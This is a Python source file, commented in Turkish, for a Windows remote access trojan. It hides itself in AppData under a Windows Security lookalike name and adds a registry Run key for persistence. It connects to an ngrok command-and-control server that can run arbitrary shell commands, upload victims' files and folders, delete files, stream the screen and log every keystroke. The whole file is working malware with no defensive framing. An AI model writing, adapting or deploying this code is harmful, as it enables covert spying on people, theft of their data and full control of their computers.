import subprocess, sys, time, gc, os, threading, json, socket, base64, io, ctypes, zipfile, shutil

# --- 1. KALICILIK (PERSISTENCE) VE OTOMATİK BAŞLATMA ---
def set_persistence():
    try:
        import winreg # Kayıt defteri işlemleri için
        
        target_name = "SecurityHealthSystray.pyw"
        # Dosyayı AppData içine gizleyelim
        appdata = os.getenv('APPDATA')
        hidden_dir = os.path.join(appdata, "WindowsSecurity")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)
            
        target_path = os.path.join(hidden_dir, target_name)
        current_file = os.path.abspath(sys.argv[0])

        # Dosyayı kopyala
        if not os.path.exists(target_path):
            shutil.copy2(current_file, target_path)

        # KAYIT DEFTERİNE EKLEME (HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run)
        # pythonw.exe ile tam yolu birleştiriyoruz
        run_command = f'pythonw.exe "{target_path}"'
        
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "WindowsSecurityHealth", 0, winreg.REG_SZ, run_command)
        winreg.CloseKey(reg_key)
        
        # Dosyayı gizle
        subprocess.run(['attrib', '+h', target_path], capture_output=True, shell=True)
        
    except Exception as e:
        pass

# KODUN BAŞINDA ÇALIŞTIR
set_persistence()

# --- 2. OTOMATİK KÜTÜPHANE VE PIP YÜKLEYİCİ ---
REQUIRED_PACKAGES = ['python-socketio[client]', 'mss', 'Pillow', 'psutil', 'pygetwindow', 'pynput', 'requests']

def install_missing_packages():
    # İlk olarak Pip'i güncelle
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "--quiet"])
    except:
        pass

    for package in REQUIRED_PACKAGES:
        import_name = package.split('[')[0].replace('python-', '').replace('-', '_')
        try: 
            __import__(import_name)
        except ImportError:
            try: 
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            except: 
                pass
    gc.collect() # Artık gc import edildiği için hata vermeyecek

install_missing_packages()

# --- ŞİMDİ DİĞER KÜTÜPHANELERİ ÇAĞIRABİLİRİZ ---
import mss, socketio, psutil, requests
from PIL import Image
from pynput import keyboard
try: import pygetwindow as gw
except: pass

def minimize_memory():
    try:
        gc.collect()
        if os.name == 'nt':
            handle = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.psapi.EmptyWorkingSet(handle)
    except: pass

TARGET_URL = "https://silviculturally-cliffiest-rosalie.ngrok-free.dev" 
CLIENT_ID = socket.gethostname()
is_streaming = False 
sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=5)

def safe_decode(data):
    for codec in ['cp854', 'cp1254', 'utf-8', 'latin-1']:
        try: return data.decode(codec)
        except: continue
    return data.decode('utf-8', errors='replace')

@sio.event
def connect():
    sio.emit('register', {'id': CLIENT_ID})
    minimize_memory()

@sio.on('start_screen')
def on_start(data=None): global is_streaming; is_streaming = True
@sio.on('stop_screen')
def on_stop(data=None): global is_streaming; is_streaming = False

@sio.on('execute_command')
def on_command(data):
    if data.get('id') != CLIENT_ID: return 
    cmd = data.get('command', '').strip()
    
    if cmd.startswith("cd "):
        target_path = cmd.replace("cd ", "").replace('"', '').strip()
        try:
            os.chdir(target_path)
            current_dir = os.getcwd()
            res = f"[+] Dizin değiştirildi: {current_dir}"
            on_command({'id': CLIENT_ID, 'command': f'dir_json "{current_dir}"'})
        except Exception as e: res = f"[-] Hata: {e}"
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})
        return

    elif cmd.startswith("msgbox "):
        try:
            _, params = cmd.split(" ", 1)
            m_type, title, msg = params.split("|")
            types = {"info": 64, "warn": 48, "error": 16, "quest": 32}
            threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, msg, title, types.get(m_type, 0))).start()
            res = "[+] Mesaj kutusu gönderildi."
        except: res = "[-] Mesaj formatı hatalı."
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})

    elif cmd.startswith("download "):
        path = cmd.replace("download ", "").replace('"', '').strip()
        if os.path.exists(path):
            try:
                sio.emit('shell_output', {'id': CLIENT_ID, 'output': f"[*] Yükleme başladı: {os.path.basename(path)} (Lütfen bekleyin...)"})
                target_file = path
                temp_zip_created = False
                if os.path.isdir(path):
                    zip_path = f"{path}.zip"
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, os.path.dirname(path))
                                zipf.write(file_path, arcname)
                    target_file = zip_path
                    temp_zip_created = True
                with open(target_file, 'rb') as f:
                    r = requests.post(f"{TARGET_URL}/upload_file", files={'file': f}, data={'id': CLIENT_ID}, timeout=None)
                if r.status_code == 200:
                    res = f"[+] Başarıyla sunucuya aktarıldı: {os.path.basename(target_file)}"
                else:
                    res = f"[-] Sunucu hatası! Kod: {r.status_code}"
                if temp_zip_created and os.path.exists(target_file): 
                    os.remove(target_file)
            except Exception as e: res = f"[-] Kritik Yükleme Hatası: {e}"
        else: res = "[-] Dosya veya dizin bulunamadı."
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})

    elif cmd.startswith("delete "):
        path = cmd.replace("delete ", "").replace('"', '').strip()
        try:
            if os.path.exists(path):
                if os.path.isfile(path):
                    os.remove(path)
                    res = f"[+] Dosya silindi: {os.path.basename(path)}"
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                    res = f"[+] Klasör ve içeriği silindi: {os.path.basename(path)}"
                parent_dir = os.path.dirname(path)
                if not parent_dir: parent_dir = "."
                on_command({'id': CLIENT_ID, 'command': f'dir_json "{parent_dir}"'})
            else: res = "[-] Hata: Silinecek öğe bulunamadı."
        except Exception as e: res = f"[-] Silme Hatası: {e}"
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})

    elif cmd.startswith("dir_json "):
        path = cmd.replace("dir_json ", "").replace('"', '')
        if not path or path == ".": path = os.getcwd()
        try:
            items = []
            for entry in os.scandir(path):
                items.append({"name": entry.name, "path": entry.path, "type": "folder" if entry.is_dir() else "file"})
            res = "FILES_JSON:" + json.dumps(items)
        except Exception as e: res = f"Hata: {str(e)}"
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})

    elif cmd == "list_procs_grouped":
        app_list = []
        blacklist = ['textinputhost.exe', 'applicationframehost.exe', 'omapsvcbroker.exe', 'systemsettings.exe', 'nahimic3.exe', 'shellexperiencehost.exe']
        try:
            for w in gw.getAllWindows():
                if w.title != "" and hasattr(w, '_hWnd') and w._hWnd != 0 and w.visible:
                    try:
                        pid = ctypes.c_ulong()
                        ctypes.windll.user32.GetWindowThreadProcessId(w._hWnd, ctypes.byref(pid))
                        p = psutil.Process(pid.value)
                        exe_name = p.name().lower()
                        if exe_name in blacklist: continue
                        app_list.append({
                            "title": f"{exe_name.replace('.exe','').upper()} ({w.title[:20]}...)", 
                            "pid": pid.value
                        })
                    except: continue
            if not app_list:
                for p in psutil.process_iter(['name', 'pid']):
                    if p.info['name'].lower() in ['chrome.exe', 'spotify.exe', 'discord.exe']:
                        app_list.append({"title": p.info['name'].upper(), "pid": p.info['pid']})
            sio.emit('shell_output', {'id': CLIENT_ID, 'output': "PROCS_JSON:" + json.dumps(app_list[:40])})
        except Exception as e: 
            sio.emit('shell_output', {'id': CLIENT_ID, 'output': f"Hata: {e}"})
        return
    else:
        try:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd())
            out, err = p.communicate()
            res = safe_decode(out) + safe_decode(err)
            if not res.strip(): res = "Komut yürütüldü."
        except Exception as e: res = str(e)
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})
    minimize_memory()

def stream_screen():
    with mss.mss() as sct:
        while True:
            if sio.connected and is_streaming:
                try:
                    mon = sct.monitors[1] if sys.platform == 'win32' and len(sct.monitors) > 1 else sct.monitors[0]
                    img = sct.grab(mon)
                    raw = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").resize((960, 540))
                    buffer = io.BytesIO()
                    raw.save(buffer, format='JPEG', quality=25)
                    sio.emit('screen_data', {'id': CLIENT_ID, 'image': base64.b64encode(buffer.getvalue()).decode()})
                    buffer.close(); del raw; minimize_memory()
                except: pass
            time.sleep(1.0 if is_streaming else 2.5)

def on_press(key):
    try:
        if sio.connected: sio.emit('key_stroke', {'id': CLIENT_ID, 'key': str(key).replace("'", "")})
    except: pass

if __name__ == "__main__":
    threading.Thread(target=stream_screen, daemon=True).start()
    threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True).start()
    
    while True:
        try:
            if not sio.connected: 
                sio.connect(TARGET_URL, transports=['websocket', 'polling'], headers={'ngrok-skip-browser-warning': 'true'})
            time.sleep(5)
        except:
            time.sleep(5)
            
